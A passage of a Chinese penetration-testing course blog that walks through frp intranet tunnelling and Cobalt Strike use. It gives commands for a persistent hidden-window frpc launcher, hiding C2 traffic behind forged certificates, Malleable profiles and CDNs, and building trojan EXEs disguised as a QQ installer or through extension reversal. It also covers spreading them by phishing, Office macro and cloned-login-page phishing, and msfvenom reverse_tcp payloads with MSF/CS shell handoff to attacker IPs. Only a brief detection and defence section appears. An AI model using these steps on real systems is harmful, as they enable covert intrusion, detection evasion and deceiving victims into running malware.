<p><strong>2、客户端配置</strong></p>
<p>将frpc.exe和frpc.toml上传到客户端</p>
<p>修改frpc.exe</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端配置</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 服务器ip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的bind_port⼀致</span></span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的token⼀致</span></span><br><span class="line">token = 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置ssh服务</span></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个⾃定义，之后再ssh连接的时候要⽤</span></span><br><span class="line">remote_port = 6000</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rdp配置远程连接</span></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port =3389</span><br><span class="line">remote_port = 7002</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置http服务，可⽤于⼩程序开发、远程调试等，如果没有可以不写下⾯的</span></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 8080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">web域名</span></span><br><span class="line">subdomain = test.hijk.pw</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⾃定义的远程服务器端⼝，例如8080</span></span><br><span class="line">remote_port = 8080</span><br></pre></td></tr></table></figure>



<p>上⾯frpc.ini的rdp字段都是⾃⼰定义的规则，⾃定义端⼝对应时格式如下。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[xxx]”表示⼀个规则名称，⾃⼰定义，便于查询即可。</span><br><span class="line"></span><br><span class="line">“type”表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要请⾃⾏查询frp⼿册。</span><br><span class="line"></span><br><span class="line">“local_port”是本地应⽤的端⼝号，按照实际应⽤⼯作在本机的端⼝号填写即可。</span><br><span class="line"></span><br><span class="line">“remote_port”是该条规则在服务端开放的端⼝号，⾃⼰填写并记录即可。</span><br></pre></td></tr></table></figure>





<p>RDP</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">即Remote Desktop 远程桌⾯，Windows的RDP默认端⼝是3389，协议为TCP，建议使⽤frp远程</span><br><span class="line">连接前，在局域⽹中测试好，能够成功连接后再使⽤frp穿透连接。</span><br></pre></td></tr></table></figure>



<p>配置完成frpc.ini后，就可以运⾏frpc了,注意防⽕墙要放⾏remote_port端⼝</p>
<p>在cs的输⼊beacon命令启动客户端</p>
<p>cd C:frp</p>
<p>shell frpc.exe -c frpc.ini</p>
<p>启动后服务器端操作界⾯会回显⼀个连接</p>
<p><img src="/img/oldboy/image-20250302224813994.png" alt="image-20250302224813994"></p>
<p>此时可以在局域⽹外使⽤相应程序访问 x.x.x.x:xxxx （IP为VPS的IP，端⼝为⾃定义的remote_port）即</p>
<p>可访问到相应服务</p>
<p>使⽤远程桌⾯进⾏连接</p>
<p><img src="/img/oldboy/image-20250302224842021.png" alt="image-20250302224842021"></p>
<h3 id="客户端后台运⾏及开机⾃启"><a href="#客户端后台运⾏及开机⾃启" class="headerlink" title="客户端后台运⾏及开机⾃启"></a>客户端后台运⾏及开机⾃启</h3><p>frpc运⾏时始终有⼀个命令⾏窗⼝运⾏在前台，影响美观，我们可以使⽤⼀个批处理⽂件来将其运⾏在</p>
<p>后台，⽽且可以双击执⾏，每次打开frpc不⽤再⾃⼰输命令了。</p>
<p>在任何⼀个⽬录下新建⼀个⽂本⽂件并将其重命名为“frpc.bat”，编辑，粘贴如下内容并保存。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;\%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;\%~nx0&quot;&quot; h&quot;,0)</span><br><span class="line">(window.close)&amp;&amp;exit</span><br><span class="line">:begin</span><br><span class="line">REM</span><br><span class="line">cd C:\frp</span><br><span class="line">frpc -c frpc.ini</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>



<p>将cd后的路径更改为你的frpc实际存放的⽬录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">之后直接运⾏这个 .bat ⽂件即可启动frpc并隐藏窗⼝（可在任务管理器中退出）。</span><br><span class="line">⾄于开机启动，把这个 .bat ⽂件直接扔进Windows的开机启动⽂件夹就好了 :)</span><br><span class="line">⾄此，客户端配置完成，之后就是你⾃⼰根据需要在frpc.ini后追加规则即可。</span><br><span class="line">强烈建议你在使⽤frp直接测试内⽹穿透前，先在局域⽹内测试好相关功能的正常使⽤，并配置好可</span><br><span class="line">能会影响的Windows防⽕墙等内容，在内⽹调试通过后再使⽤frp进⾏内⽹穿透测试。</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackmang/p/14516969.html">frp+proxifier实现内网socks5反向代理 - 枕桃花吹长笛 - 博客园</a></p>
<h2 id="正向代理穿透"><a href="#正向代理穿透" class="headerlink" title="正向代理穿透"></a>正向代理穿透</h2><p>需要将恶意文件上传到服务端</p>
<p><a target="_blank" rel="noopener" href="https://github.com/zema1/suo5/tree/main/assets">suo5&#x2F;assets at main · zema1&#x2F;suo5</a></p>
<p>针对不同的前端页面上传不同的恶意文件</p>
<p><img src="/img/oldboy/image-20250303101252469.png" alt="image-20250303101252469"></p>
<p>使用链接工具进行连接</p>
<img src="/img/oldboy/image-20250303102504174.png" alt="image-20250303102504174" style="zoom:50\%;" />







<p>非图形化命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./suo5 -t https://example.com/proxy.jsp -l 127.0.0.1:1111</span> </span><br></pre></td></tr></table></figure>







<p>使用proxifier或者使用火狐配置代理端口即可使用</p>
<h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><h2 id="Cobalt-Striket提权工具"><a href="#Cobalt-Striket提权工具" class="headerlink" title="Cobalt Striket提权工具"></a>Cobalt Striket提权工具</h2><p>介绍：CobaltStrike集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Windows exe木马生成、Windows dll木马生成、Java木马生成、Office 宏病毒生成、木马捆绑浏览器自动攻击等强大的功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p>
<h3 id="CS流量隐藏"><a href="#CS流量隐藏" class="headerlink" title="CS流量隐藏"></a>CS流量隐藏</h3><p>一、HTTP&#x2F;HTTPS 流量特征</p>
<p>​	 默认证书特征  </p>
<p>​		默认使用自签名SSL证书，证书信息包含固定字段： CN&#x3D;Major Cobalt Strike、Alias name: cobaltstrike。 </p>
<p>​		检测建议：检查TLS证书的Subject和Issuer字段，匹配固定关键字。 </p>
<p>​	URI路径的checksum8规则  </p>
<p>​		Stager下载Stage时，HTTP请求路径需满足 ASCII码之和 % 256 &#x3D; 92（如 &#x2F;Yle2、&#x2F;cKTZ）。</p>
<p>​		 检测建议：对URI路径动态计算checksum8值，匹配结果为92的请求。 </p>
<p>​	心跳包特征 </p>
<p>​		 Beacon与C2的HTTP心跳包间隔固定（默认60秒），上下行数据长度固定。 </p>
<p>​		检测建议：分析流量中周期性固定长度的GET&#x2F;POST请求。 </p>
<p>​	HTTP头异常  </p>
<p>​		默认配置中Cookie字段携带Base64加密的元数据，且User-Agent可能固定（旧版本）或随机但无浏览器特征。</p>
<p>​		检测建议：检查Cookie字段是否包含Base64编码的异常数据。 </p>
<p>二、DNS 流量特征</p>
<p>​	 异常DNS查询  </p>
<p>​		DNS Beacon使用 www.、api.、post. 等前缀发起A&#x2F;TXT记录查询。</p>
<p>​		响应结果包含非常规IP（如 0.0.0.0、0.0.0.241）。 </p>
<p>​		检测建议：监控异常DNS查询模式及非标准响应IP。 </p>
<p>​	TXT记录载荷传输  </p>
<p>​		使用TXT记录传输加密后的指令或数据，查询内容包含长随机字符串。 </p>
<p>​		检测建议：分析TXT记录长度和频率，匹配加密数据特征。 </p>
<p>三、强特征（需源码级修改）</p>
<p>​	 JA3&#x2F;JA3S指纹</p>
<p>​		TLS握手阶段的Client Hello（JA3）和Server Hello（JA3S）存在固定哈希值（如 72a589da586844d7f0818ce684948eea）。 </p>
<p>​		检测建议：提取TLS握手阶段的JA3&#x2F;JA3S哈希值进行匹配。 Stager响应特征  即使修改URI路径，默认仍响应符合checksum8规则的请求（如访问任意路径返回Stage）。 </p>
<p>​		检测建议：对未配置的URI路径返回210KB左右数据的服务器进行标记。</p>
<h4 id="修改证书特征值"><a href="#修改证书特征值" class="headerlink" title="修改证书特征值"></a>修改证书特征值</h4><p>1、cobalt strike 默认的证书存在cobalt strike 的指纹信息。需要keytool (Java数据证书的管理工具) 修改证书信息，创建新的cobaltstrike.store。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool.exe -keystore test.store -storepass test2025 -keypass test2025 -genkey -keyalg RSA -alias test.com -dname &quot;CN=test e-Szigno Root CA, OU=e-Szigno CA, O=test Ltd., L=Budapest, ST=HU, C=HU&quot;</span><br></pre></td></tr></table></figure>



<p>ps:推荐在cs文件夹下运行该命令</p>
<p>2、使用github中其他流量的特征值</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></p>
<p>我们就用office365_calendar.profile来举例</p>
<p>我们要修改的是此文件中用到我们刚刚生成证书的信息(配置文件没有，需要手动添加信息)</p>
<p>https-certificate {</p>
<p>​	set CN “test e-Szigno Root CA”;</p>
<p>​	set O “test Ltd”;</p>
<p>​	set C “HU”;</p>
<p>​	set L “US”;</p>
<p>​	set OU “e-Szigno CA”;</p>
<p>​	set ST “HU”;</p>
<p>​	set validity “365”;</p>
<p>}</p>
<p>#设置，修改成你的证书名称和证书密码</p>
<p>code-signer{</p>
<p>​	set keystore “test.store”;</p>
<p>​	set password “test2025”;</p>
<p>​	set alias “test.com”;</p>
<p>}</p>
<p>3、最后我们将这2个文件同时放到vps上启动</p>
<p>.&#x2F;teamserver ip 密码 office365_calendar.profile</p>
<p>可以修改.&#x2F;teamserver 端口实现敏感端口绕过</p>
<h4 id="CDN接入"><a href="#CDN接入" class="headerlink" title="CDN接入"></a>CDN接入</h4><p>使用CDN内容分发网络的多节点分布式技术，通过“加速、代理、缓存”隐藏在后面的静态文件或服务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或IP</p>
<p>1、开启一个listen</p>
<p>​	NAME:随便填写<br>​	Payload：选择Beacon http<br>​	HTTP hosts：写入自己的域名<br>​	HTTP host(Stager):写入自己的域名<br>​	HTTP Port（C2）：写入8880端口，可以访问到的都可以。<br>​	HTTP header：写入自己的域名</p>
<img src="/img/oldboy/1-51.png" style="zoom:50\%;" />

<p>需要配置域名，然后免费申请CDN</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80115097/article/details/138341090">内网神器Cobalt Strike隐藏特征与流量混淆._cobaltstrike cdn-CSDN博客</a></p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h4><p>服务端一般部署在云主机Linux操作系统中</p>
<p>服务端启动（基于Java环境需要安装jdk）本次运行环境为Linux。切换到程序目录，运行程序+真实IP+密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">chmod +x teamserver</span><br><span class="line">chmod +x TeamServerImage</span><br><span class="line"> </span><br><span class="line">./teamserver 192.168.138.129 geekgold</span><br></pre></td></tr></table></figure>

<img src="/img/oldboy/1-30.png" style="zoom:50\%;" />



<h4 id="客户端启动"><a href="#客户端启动" class="headerlink" title="客户端启动"></a>客户端启动</h4><img src="/img/oldboy/1-31.png" style="zoom:50\%;" />



<p>注意：需要保持服务端和客户端的版本一致</p>
<h4 id="EXE可执行文件"><a href="#EXE可执行文件" class="headerlink" title="EXE可执行文件"></a>EXE可执行文件</h4><p>1、创建监听器</p>
<img src="/img/oldboy/1-32.png" style="zoom: 33\%;" />





<p>2、生成木马</p>
<img src="/img/oldboy/1-33.png" style="zoom: 50\%;" />



<p>将文件保存到桌面即可</p>
<p>3、通过钓鱼、社工的方式将可执行exe文件发送至靶机，并诱导点击</p>
<img src="/img/oldboy/1-34.png" style="zoom:50\%;" />



<h5 id="木马隐藏（压缩法）"><a href="#木马隐藏（压缩法）" class="headerlink" title="木马隐藏（压缩法）"></a>木马隐藏（压缩法）</h5><p>1、设置为压缩文件</p>
<img src="/img/oldboy/1-36.png" style="zoom:50\%;" />



<p>设置文件自解压至指定文件夹（尽量选择用户含有的文件夹）</p>
<img src="/img/oldboy/1-37.png" style="zoom:50\%;" />



<p>先解压外壳文件QQ的安装软件，然后运行木马文件</p>
<img src="/img/oldboy/1-38.png" style="zoom:50\%;" />

<p>隐藏文件</p>
<img src="/img/oldboy/1-39.png" style="zoom:50\%;" />



<img src="/img/oldboy/1-40.png" style="zoom:50\%;" />



<p>2、使用Restorator2018，将QQ安装包，以及EXE文件拖到程序里</p>
<p>这里可以看到压缩之后的文件，图标发生了改变，需要将图标进行替换</p>
<p><strong>别忘记crtl+s保存，使之生效</strong></p>
<img src="/img/oldboy/1-35.png" style="zoom:50\%;" />



<p>双击测试：</p>
<p><img src="/img/oldboy/1-41.png"></p>
<p>上线成功</p>
<p><img src="/img/oldboy/1-42.png"></p>
<h5 id="文件反转法"><a href="#文件反转法" class="headerlink" title="文件反转法"></a>文件反转法</h5><p>通过将EXE文件后缀反转的方式，隐藏exe后缀</p>
<p>将文件命名为cmdgpj.exe</p>
<img src="/img/oldboy/1-44.png" style="zoom:50\%;" />



<p>在线生成图标：<a target="_blank" rel="noopener" href="https://www.bitbug.net/">https://www.bitbug.net/</a></p>
<p>打开Resource Hacker工具，在file中open打开exe木马文件，选择上传图标，crtl+s保存</p>
<img src="/img/oldboy/1-45.png" style="zoom:50\%;" />

<p>生成图标</p>
<img src="/img/oldboy/1-47.png" style="zoom:33\%;" />



<p>诱导点击使之上线</p>
<p> <img src="/img/oldboy/1-46.png"></p>
<h4 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h4><p>首先cs生成宏</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps1.jpg" alt="img" style="zoom:50\%;" /> 

<p>选择复制</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps2.jpg" alt="img" style="zoom:50\%;" /> 

<p>新建一个word</p>
<p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps3.jpg" alt="img" style="zoom:50\%;" /> 

<p>编写主体内容后，点击 “开发工具 — Visual Basic”，双击 “ThisDocument”<br>，将原有内容全部清空，然后将宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps4.jpg" alt="img" style="zoom:50\%;" /> 

<p>另存为</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps5.jpg" alt="img" style="zoom:50\%;" /> 





<h4 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h4><p>示例页面：<a target="_blank" rel="noopener" href="http://www.9377.com/login.php">网页游戏平台_精品手游_一起玩更快乐-9377网页游戏</a></p>
<p>使用cs克隆网站登录页面</p>
<img src="/img/oldboy/1-48.png" style="zoom:50\%;" />







<p>获得attack url：<a target="_blank" rel="noopener" href="http://192.168.138.129:81/">http://192.168.138.129:81/</a></p>
<p>诱导用户点击</p>
<img src="/img/oldboy/1-49.png" style="zoom:50\%;" />



<p>查看weblog记录</p>
<img src="/img/oldboy/1-50.png" style="zoom: 33\%;" />



<h3 id="MSF联动"><a href="#MSF联动" class="headerlink" title="MSF联动"></a>MSF联动</h3><p>CS Server端和CS Client端工具开启方式直接略过</p>
<h4 id="CS反弹shell到MSF"><a href="#CS反弹shell到MSF" class="headerlink" title="CS反弹shell到MSF"></a>CS反弹shell到MSF</h4><p>参考资料:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Zlirving_/article/details/113862910">https://blog.csdn.net/Zlirving_/article/details/113862910</a></p>
<p>先建立监听器</p>
<p>上线</p>
<img src="/img/oldboy/wps1.jpg" alt="img" style="zoom: 80\%;" /> 

 

<p>Msf进入监听模块</p>
<p>​	use exploit&#x2F;multi&#x2F;handler</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>
<p>​	set lhost 192.168.0.109</p>
<p>​	set lport 8011</p>
<p>​	Exploit</p>
<p>CS添加监听器</p>
<p><img src="/img/oldboy/wps2.jpg" alt="img"></p>
<p>右键上线的主机，增加会话</p>
<p><img src="/img/oldboy/wps3.jpg" alt="img"> </p>
<p>或者直接spawn cs-msf（监听器名称）</p>
<p><img src="/img/oldboy/wps4.jpg" alt="img"> </p>
<p>Msf的联动成功</p>
<h4 id="MSF反弹shell到CS"><a href="#MSF反弹shell到CS" class="headerlink" title="MSF反弹shell到CS"></a>MSF反弹shell到CS</h4><p>msf制作木马进行上线</p>
<p>​	msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.102 LPORT&#x3D;4444 -f exe -o msf.exe</p>
<p>进入msf监听模块</p>
<p>​	use exploit&#x2F;multi&#x2F;handler</p>
<p>设置payload反弹shell（使用和木马相同的payload）</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>设置LHOST、LPORT参数</p>
<p>​	set LHOST 192.168.31.24(本地IP）</p>
<p>​	set LPORT 4444（设置的端口）</p>
<p>​	show options</p>
<p>开始攻击</p>
<p><img src="/img/oldboy/wps5.jpg" alt="img"> </p>
<p>后台运行</p>
<p><img src="/img/oldboy/wps6.jpg" alt="img"> </p>
<p>启动CS并创建监听器</p>
<p><img src="/img/oldboy/wps7.jpg" alt="img"> </p>
<p>MSF上使用payload_inject模块</p>
<p>​	use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject &#x2F;&#x2F;使用该模块可以将 Metasploit 获取到的会话注入到CS中</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_http &#x2F;&#x2F;和cs监听器保持一致</p>
<p>​	set prependmigrate true </p>
<p>​	set DisablePayloadHandler true &#x2F;&#x2F;用来禁用 Metasploit payload handler的监听 因为要监听到cs上</p>
<p>​	set lhost 192.168.0.109   &#x2F;&#x2F;CS的IP</p>
<p>​	set lport 1111  &#x2F;&#x2F;CS上的listen端口</p>
<p>​	set session 7  &#x2F;&#x2F;要转发的session</p>
<p><img src="/img/oldboy/wps8.jpg" alt="img"> </p>
<p>Run</p>
<p><img src="/img/oldboy/wps9.jpg" alt="img"> </p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>看到报警平台报警存在外连，可能是通过cs工具外连解决思路：</p>
<p>当CS配置了域前置，通过ping或者查看外连端口的IP，放到危险报警平台分析，通常会显示正常的CDN服务器，将CDN所在的服务厂商直接封禁掉，或者直接把他的域名禁止掉。</p>
<p>注意：进程号是rundll32.exe，可能是远控端口</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz">GoldY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz/posts/f254f946.html">https://www.geekgold.xyz/posts/f254f946.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.geekgold.xyz" target="_blank">GoldY</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E8%80%81%E7%94%B7%E5%AD%A9%E5%AE%89%E5%85%A8/">老男孩安全</a></div><div class="post-share"><div class="social-share" data-image="/img/oldboy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/img/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/f7a7b84b.html" title="老男孩--DDOS攻击与防御(4)"><img class="cover" src="/img/oldboy.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">老男孩--DDOS攻击与防御(4)</div></div><div class="info-2"><div class="info-item-1">基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。 DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源 DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。 被攻击时的现象：  被攻击的主机上有大量等待的TCP连接。 网络中充斥着大量的无用的数据包，源地址为假。 制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。 利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。 严重时会造成系统死机。  DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type...</div></div></div></a><a class="pagination-related" href="/posts/fb59692f.html" title="云计算方向-Kubernetes命令总结"><img class="cover" src="/img/cloud.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">云计算方向-Kubernetes命令总结</div></div><div class="info-2"><div class="info-item-1">一.基础命令1.状态查询12345678910111213# 查看集群信息kubectl cluster-infosystemctl status kube-apiserversystemctl status kubeletsystemctl status kube-proxysystemctl status kube-schedulersystemctl status kube-controller-managersystemctl status docker# 查询api服务kubectl get apiservice  2.node相关12345678910111213141516171819# 查看namespaceskubectl get namespaces# 为节点增加lablekubectl label nodes 10.126.72.31 points=test# 查看节点和lablekubectl get nodes --show-labels# 查看状态kubectl get componentstatuses# Node的隔离与恢复##...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/3b40f62a.html" title="老男孩--信息收集(1)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--信息收集(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/e33055a4.html" title="老男孩--手机端信息收集及渗透(3)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--手机端信息收集及渗透(3)</div></div><div class="info-2"><div class="info-item-1">——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取 AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner 一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 使用配置： 12cd AppInfoScannerpython -m pip install -r requirements.txt    运行方法： 12345678#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File...</div></div></div></a><a class="pagination-related" href="/posts/f7a7b84b.html" title="老男孩--DDOS攻击与防御(4)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--DDOS攻击与防御(4)</div></div><div class="info-2"><div class="info-item-1">基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。 DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源 DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。 被攻击时的现象：  被攻击的主机上有大量等待的TCP连接。 网络中充斥着大量的无用的数据包，源地址为假。 制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。 利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。 严重时会造成系统死机。  DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type...</div></div></div></a><a class="pagination-related" href="/posts/caf167a2.html" title="老男孩--Web十大常规漏洞(2)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--Web十大常规漏洞(2)</div></div><div class="info-2"><div class="info-item-1">SQL注入漏洞注入概念1.1.1 什么是注入漏洞（SQL） ​	接收相关参数未经过处理直接带入数据库查询操作 具备的两个关键点：  用户能够控制输入（网站交互操作） 原本程序接受了用户输入的信息，并且直接执行（没有做过滤）  1.1.2 SQL注入漏洞的分类&#x2F;特点 ​	服务端漏洞（数据库服务-代码有逻辑问题） ​	与操作系统、数据库类型、脚本语言类型无关 1.1.3 SQL漏洞产生原理 ​	代码中没有对用户的传入参数信息，做处理 1.1.4 SQL注入的目的  窃取数据信息 修改数据信息 破坏数据信息  1.1.5 SQL注入攻击流程：  获取攻击网站域名（子域名） 获取攻击网站注入点 获取网站业务数据库名称 